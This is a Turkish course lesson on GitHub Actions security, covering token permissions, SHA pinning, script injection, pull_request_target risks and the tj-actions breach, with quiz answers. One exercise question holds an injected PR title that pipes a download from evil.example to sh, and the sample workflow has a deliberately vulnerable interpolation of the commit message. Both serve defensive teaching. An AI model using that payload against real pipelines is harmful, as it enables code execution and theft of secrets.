---
kimlik: pipeline-009
baslik: "GitHub Actions güvenliği"
donem: 6
sira: 9
sure: 35
neden: "Pipeline, depodaki sırlara ve yayın yetkisine sahip bir programdır; yani saldırganın en çok istediği hedeflerden biridir. Workflow dosyasına yazdığın bir satır, yanlış yazılırsa dışarıdan bir PR'ın sırlarını çalmasına izin verebilir."
analoji:
  baslik: "Ofis anahtarı ve misafir"
  metin: "Her çalışana tüm odaların anahtarını vermezsin; yalnız işi için gereken kapıyı açan anahtarı verirsin. Dışarıdan gelen misafire (PR) ise hiç anahtar vermeden, sadece masada konuşursun. Workflow izinleri ve sırlar için kural aynıdır. Sınırı: izinleri daraltmak saldırıyı imkânsız kılmaz, patlama yarıçapını küçültür."
gorev:
  aciklama: "Geçici bir klasörde örnek bir workflow dosyası yazıp zayıf noktalarını arayacaksın. Hiçbir şey çalıştırılmıyor, yalnız dosya metni inceleniyor. Üçüncü komut GitHub'dan yalnız bir etiketin işaret ettiği commit'in adını okur."
  komutlar:
    - |
      mkdir -p /tmp/actions/.github/workflows && cd /tmp/actions
      cat > .github/workflows/ci.yml <<'EOF'
      name: ci
      on: [push]
      jobs:
        test:
          runs-on: ubuntu-latest
          steps:
            - uses: actions/checkout@v4
            - run: echo "Merhaba ${{ github.event.head_commit.message }}"
      EOF
    - "grep -nE 'uses: .+@v[0-9]+' .github/workflows/ci.yml"
    - "git ls-remote https://github.com/actions/checkout refs/tags/v4"
    - "grep -n 'permissions' .github/workflows/ci.yml || echo 'permissions bloğu yok'"
  soru: "Bu workflow'da üç zayıflık var: etiketle çağrılan aksiyon, permissions bloğunun yokluğu ve komuta gömülen girdi. Her birinin kötüye kullanılmasına birer cümlelik örnek ver."
  telefon:
    soru: "Bir PR, workflow'da `run: echo ${{ github.event.pull_request.title }}` satırını tetikliyor ve başlığı `\"; curl evil.example | sh; \"` olan bir PR açılıyor. Ne olur ve nasıl düzeltirsin?"
    cevap: "İfade shell komutuna metin olarak gömüldüğü için başlıktaki parça komut olarak çalışır (script injection). Düzeltme: değeri bir ortam değişkenine (`env:`) ata ve komutta `\"$BASLIK\"` olarak kullan; böylece veri olarak kalır."
sorular:
  - id: pipeline-009-s1
    soru: "`permissions:` bloğu neden önemlidir ve varsayılan nasıl olmalıdır?"
    cevap: "Workflow'un GITHUB_TOKEN ile ne yapabileceğini belirler. En az yetki ilkesiyle varsayılanı yalnız okuma (`contents: read`) yaparsın, yazma iznini yalnız gereken job'a verirsin. Böylece ele geçirilen bir adım daha az zarar verir."
    ipucu: "Token'a ne kadar yetki verirsen, ele geçirildiğinde saldırgan o kadar iş yapar."
  - id: pipeline-009-s2
    soru: "`uses: actions/checkout@v4` ile `uses: actions/checkout@<40 karakterlik SHA>` arasındaki güvenlik farkı nedir?"
    cevap: "Etiket (v4) taşınabilir ya da silinebilir; aksiyonun deposu ele geçirilirse etiket kötü koda yönlenebilir. Tam commit SHA'sı değişmez bir kayıttır, o yüzden SHA ile sabitlemek GitHub'ın önerisidir. SHA'nın aksiyonun asıl deposundan geldiğini de doğrulamalısın."
    ipucu: "Hareketli bir etiket mi, değişmez bir kayıt mı daha güvenli?"
  - id: pipeline-009-s3
    soru: "`pull_request_target` tetikleyicisi neden riskli ve en tehlikeli kullanımı nedir?"
    cevap: "Hedef depo bağlamında çalışır: sırlara ve yazma yetkisine erişebilir. Bu workflow aynı zamanda PR'ın (fork'tan gelen) kodunu checkout edip çalıştırırsa, saldırgan kendi kodunu yetkili ortamda çalıştırır."
    ipucu: "Bu tetikleyici hangi bağlamda, hangi sırlarla çalışır?"
  - id: pipeline-009-s4
    soru: "Dışarıdan gelen PR'ları test etmek için güvenli desen nedir?"
    cevap: "Yetkisiz `pull_request` workflow'unda build ve test yapıp sonuçları artefakt olarak kaydetmek, ayrıcalıklı iş gerekiyorsa ayrı bir `workflow_run` workflow'unda yalnız o artefaktı güvenilmez veri olarak işlemek. PR koduna sırlar verilmez."
    ipucu: "Yetkisiz bir ortamda test, yetkili bir ortamda ikinci adım: iki adımı ayır."
  - id: pipeline-009-s5
    soru: "Bir PR incelemesinde workflow'a şu satır eklenmiş: `run: echo \"${{ github.event.pull_request.title }}\"`. Ne söylersin?"
    cevap: "PR başlığı saldırgan kontrolündedir ve ifade, çalışmadan önce metin olarak komuta yerleştirilir; başlığa kabuk komutu yazan biri workflow'da komut çalıştırabilir (script injection). Başlığı `env:` ile bir ortam değişkenine ver ve komutta `\"$BASLIK\"` olarak kullan; böylece veri olarak işlenir."
    ipucu: "Başlığı kim yazıyor ve kabuk onu komut mu veri mi sayıyor?"
hizliKontrol:
  - soru: "`permissions: contents: read` ne sağlar?"
    secenekler:
      - Workflow'un depoya yazmasına izin verir
      - GITHUB_TOKEN'ın yetkisini yalnız okumayla sınırlar
      - Sırları gizler
      - Aksiyonları sabitler
    dogru: 1
    aciklama: Token'ı en dar yetkiyle çalıştırmak, bir adım ele geçirilse bile zararı sınırlar.
    ipucu: Hangi nesnenin yetkisini daraltıyor?
  - soru: Hangisi SHA ile sabitlemenin bir sınırıdır?
    secenekler:
      - SHA'nın kimin deposundan alındığını ayrıca doğrulamak gerekir
      - Aksiyon artık çalışmaz
      - Sırlara erişim kaldırılır
      - Dependabot kullanılamaz
    dogru: 0
    aciklama: SHA'yı aksiyonun resmi deposundan almak gerekir; sabitlemek aksiyonun sırlara erişimini kaldırmaz.
    ipucu: Bir fork'tan alınan SHA'ya ne kadar güvenebilirsin?
sikHatalar:
  - hata: "`pull_request_target` ile fork PR'ın kodunu checkout edip çalıştırmak."
    dogrusu: Test için `pull_request` kullan; ayrıcalıklı işi ayrı bir `workflow_run` ile yap.
  - hata: Workflow'da `permissions` yazmamak, varsayılana güvenmek.
    dogrusu: "En üstte `contents: read` yaz, yazma iznini yalnız gereken job'a ver."
  - hata: Üçüncü taraf aksiyonu `@v1` ile çağırmak.
    dogrusu: Tam commit SHA ile sabitle, yoruma sürümü yaz, Dependabot ile güncelle.
olay:
  baslik: tj-actions/changed-files tedarik zinciri ihlali (CVE-2025-30066)
  yil: 2025
  ozet: Mart 2025'te popüler bir GitHub Action olan tj-actions/changed-files ele geçirildi; CISA'ya göre kötü amaçlı sürüm 12-15 Mart 2025 arasında erişim anahtarları, GitHub tokenları, npm tokenları ve özel RSA anahtarları gibi sırların açığa çıkmasına yol açabiliyordu. CISA etkilenen workflow'ların sırlarının döndürülmesini önerdi.
  ders: Üçüncü taraf aksiyon, workflow'un sırlarını görür. Aksiyonları commit SHA ile sabitlemek ve sırları kısıtlamak bu tür bir ele geçirilmenin etkisini azaltır; olay sonrası sırları döndürmek şarttır.
  kaynak:
    ad: "CISA: Supply Chain Compromise of Third-Party GitHub Action (CVE-2025-30066)"
    url: https://www.cisa.gov/news-events/alerts/2025/03/18/supply-chain-compromise-third-party-github-action-cve-2025-30066
terimler:
  - GITHUB_TOKEN
  - Commit SHA sabitleme
  - pull_request_target
  - GitHub Action
  - En az yetki
derinDalis:
  - tur: okuma
    baslik: "GitHub Docs: Actions'ta güvenli kullanım"
    ayrinti: "Sırlar, GITHUB_TOKEN izinleri, aksiyonları SHA ile sabitleme ve script injection bölümleri."
    url: "https://docs.github.com/en/actions/reference/security/secure-use"
  - tur: okuma
    baslik: "GitHub Security Lab: Pwn Requests"
    ayrinti: "`pull_request_target` ile PR kodunu çalıştırmanın neden depo ele geçirilmesine yol açtığı ve alternatif desenler."
    url: "https://securitylab.github.com/resources/github-actions-preventing-pwn-requests/"
---

GitHub Actions workflow'ları (devops-006) bir sunucuda, depo hesabına bağlı yetkilerle komut çalıştırır. Bu iki güç, yani **sırlar** ve **yazma yetkisi**, workflow'u değerli bir hedef yapar. Bu derste dört savunma katmanı var.

### 1. En dar izin

Her çalışmaya otomatik bir **GITHUB_TOKEN** verilir. Ne yapabileceğini `permissions:` ile sınırla:

```yaml
permissions:
  contents: read
```

Yazma gerekirse yalnız ilgili job'a ver (ör. SARIF yüklemek için `security-events: write`). Böylece bir adım ele geçirilse bile saldırganın elinde küçük bir token olur.

### 2. Aksiyonları sabitlemek

`uses: actions/checkout@v4` bir **etiketi** izler. GitHub belgeleri bir etiketin, aksiyonun deposuna erişen kötü niyetli biri tarafından taşınabileceğini ya da silinebileceğini belirtir ve tam uzunlukta **commit SHA** ile sabitlemeyi önerir:

```yaml
- uses: actions/checkout@<40-karakterlik-sha>  # v4
```

SHA'yı aksiyonun kendi deposundan (bir fork'tan değil) aldığından emin ol. Yorum olarak sürümü yazmak okumayı kolaylaştırır. Dependabot, `github-actions` ekosistemi için SHA'ları güncel tutabilir. Üçüncü taraf aksiyonlar kodundur: sır görürler, bu yüzden kimden aldığına dikkat et.

### 3. Girdiyi komuta gömmemek

`${{ ... }}` ifadeleri çalışmadan önce metin olarak yerine konur. PR başlığı, dal adı, commit mesajı saldırgan kontrolündedir:

```yaml
# Kötü
- run: echo "${{ github.event.pull_request.title }}"
# İyi
- run: echo "$BASLIK"
  env:
    BASLIK: ${{ github.event.pull_request.title }}
```

İkinci biçimde değer shell'e komut değil, veri olarak girer.

### 4. `pull_request_target` ve fork PR'ları

Normal `pull_request` tetikleyicisi fork'tan gelen PR'larda sırları vermez; güvenlidir. `pull_request_target` ise hedef deponun bağlamında, sırlarla ve yazma yetkisiyle çalışır. Bu workflow'un PR'ın kodunu checkout edip çalıştırması, saldırganın kendi kodunu yetkili ortamda çalıştırması demektir. Kural: bu tetikleyiciyi yalnız PR koduna dokunmayan işler için (ör. etiket atmak) kullan. Test için `pull_request`, ayrıcalıklı devam için `workflow_run` desenini seç.

### Diğer iyi alışkanlıklar

- `actions/checkout`'ta `persist-credentials: false`, token'ın diskte kalmasını önler.
- Sırları yalnız ihtiyaç duyan adıma ver; repo geneline değil, ortam (environment) kapsamına ve onaya bağla.
- Workflow dosyalarını da CODEOWNERS ile koru (bir sonraki ders).

GitShield'i GitHub Action olarak çalıştırırken de aynı kurallar geçerlidir: izni `contents: read` ile sınırla, SARIF yüklemek için gereken yazma iznini yalnız o job'a ver.

### Self-hosted runner ve ortamlar

Kendi sunucunda çalışan (**self-hosted**) runner'lar GitHub'ın temiz, tek kullanımlık makinelerinden farklı olarak işler arasında kalıcıdır. Public bir depoda fork PR'larının bu runner'larda çalışmasına izin verirsen, saldırgan makineye kalıcı bir kötü yazılım bırakabilir. Public depolarda self-hosted runner kullanmaktan kaçın; kullanacaksan tek kullanımlık ve yalıtılmış yap.

Sırlar için **environment** özelliği de değerlidir: "production" ortamına bağlı sırlar yalnız belirli dallardan ve onaydan sonra verilir. Yani deploy sırrı her PR'da değil, yalnız onaylanmış bir çalışmada kullanılabilir. Bu, en az yetki ilkesini sırlara uygulamaktır.

**Güvenlik notu:** Workflow dosyasını değiştirebilen kişi, pipeline'ın yetkilerini de değiştirebilir. Bu dosyayı kod incelemesinden muaf tutma.
